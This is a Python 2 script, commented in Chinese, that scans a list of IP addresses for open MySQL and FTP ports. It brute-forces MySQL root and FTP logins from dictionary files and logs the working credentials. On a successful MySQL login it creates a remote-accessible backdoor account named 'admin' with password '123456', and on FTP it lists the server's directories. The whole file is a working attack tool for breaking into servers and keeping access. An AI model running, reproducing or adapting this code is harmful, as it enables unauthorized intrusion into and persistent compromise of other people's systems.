#!/usr/bin/env python
# _*_ coding=utf-8 _*_
import pymysql
import socket
import time
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool

import ftp_service

from ftplib import FTP
# 测试目标端口开放情况
def port_scan(save_path):
    t1 = datetime.now()
    with open('iprange.txt', 'rb') as f:
        for line in f.readlines():
            print "-------------------------------- new test ip ------------------------------------\r\n"
            print "[+] Testing ports of : " + line.strip()
            #scan_port(line.strip())
            url1 = line.strip()
            # 测试mysql端口是否开放
            sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sk.settimeout(1)
            try:
                res = sk.connect_ex((line.strip(), 3306))
                if res == 0:
                    print '[+] Mysql is ok! try to login...\r\n'
                    try_login_sqlserver(url1, save_path)

                else:
                    print res
            except Exception as e:
                print '[-] Mysql is bad! ' + str(e.message) + '\r\n'
            sk.close()
            # 测试ftp端口是否开放
            sk1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sk1.settimeout(1)
            url2 = line.strip()
            # try_login_ftp(url2, save_path)
            try:
                res1 = sk1.connect_ex((line.strip(), 21))
                print res1
                if res1 == 0:
                    print '[+] ftp service is ok! try to login...\r\n'
                    ftp_service.try_login_ftp(url2, save_path)
                else:
                    print res1
            except Exception, e:
                print '[-] ftp service login failed!' + str(e) + '\r\n'
            sk1.close()
    print datetime.now() - t1
    return

# 尝试登陆mysql服务
def try_login_sqlserver(ip, save_path):

    with open('dict.txt', 'r') as f:
        for line in f.readlines():
            print "[+] Testing ip: " + ip+" & testing password：" + line.strip()

            # information_schema 是 Mysql 的默认数据库，我们有权限操作
            # pymysql.cursors.DictCursor 以字典方式进行连接参数管理
            try:
                connection = pymysql.connect(host=ip,
                                             user='root',
                                             password=line.strip(),
                                             db='information_schema',
                                             charset='utf8mb4',
                                             cursorclass=pymysql.cursors.DictCursor)

                print "\n[+] Login successfully! try to set a backdoor account..."
                result_list = "\nsql service -- " + str(time.asctime()) + " ip: " + ip + " pwd : " + line.strip() + "\r\n"
                save_result(save_path, result_list)
                # 后门账号密码为 admin 123456
                try_set_backdoor(connection)
                connection.close()
            except Exception as e:
                # print "[-] " + str(e.message)
                print "[-] Using weakly password login failed!..." + str(e) + "\r\n"
            pass
    return

def try_set_backdoor (connection):
    try:
        with connection.cursor() as cursor:
            # 创建一个新用户
            sql = "CREATE user 'admin'@'%' identified by '123456';"
            cursor.execute(sql)
            # 将后门用户权限给到最大
            cursor.execute("flush privileges;")
            # cursor.execute("GRANT ALL privileges on *.* to 'admin'@'%' identified by '123456';")
            # cursor.execute("flush privileges;")
            # fetchone() ：返回单个的元组，也就是一条记录(row)，如果没有结果 则返回 None
            # result = cursor.fetchone()
            # print result
            # 需要手动提交
            connection.commit()
            connection.close()

            print "[+] New account set successfully!\r\n"
    except Exception as e:
        # print e
        print "[-] New account set failed! " + str(e) + '\r\n'
    return


def try_login_ftp(ip, save_path):
    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问
    try:
        ftp = FTP()
        ftp.connect(ip)
        with open("ftp_dict.txt", 'r') as f:
            for line in f.readlines():
                # print line.strip()
                user = line.strip().split("|")[0]
                pwd = line.strip().split("|")[1]
                ftp.login(user, pwd)  # 匿名访问
                # 访问成功
                print "[+] FTP service login successful！username= " + user \
                      + "pwd = " + pwd + "\r\n"
                avleable_list = "\nftp service -- " + str(time.asctime()) + " ip: " + \
                                ip + " username | pwd : " + user + " | " + pwd
                save_result(save_path, avleable_list)
                print "\n[+] 该 ftp 文件目录为："
                ftp.dir()
                break
    except Exception as e:
        # print e
        print "\n[-] ftp service is bad! " + str(e) + '\r\n'
        pass
    return

def save_result(save_path, result_list):
    s = open(save_path, "a")
    s.write(result_list)
    s.close()
    return


def main():

    port_scan(save_path="./result.txt")
    return

if __name__ == '__main__':
    main()
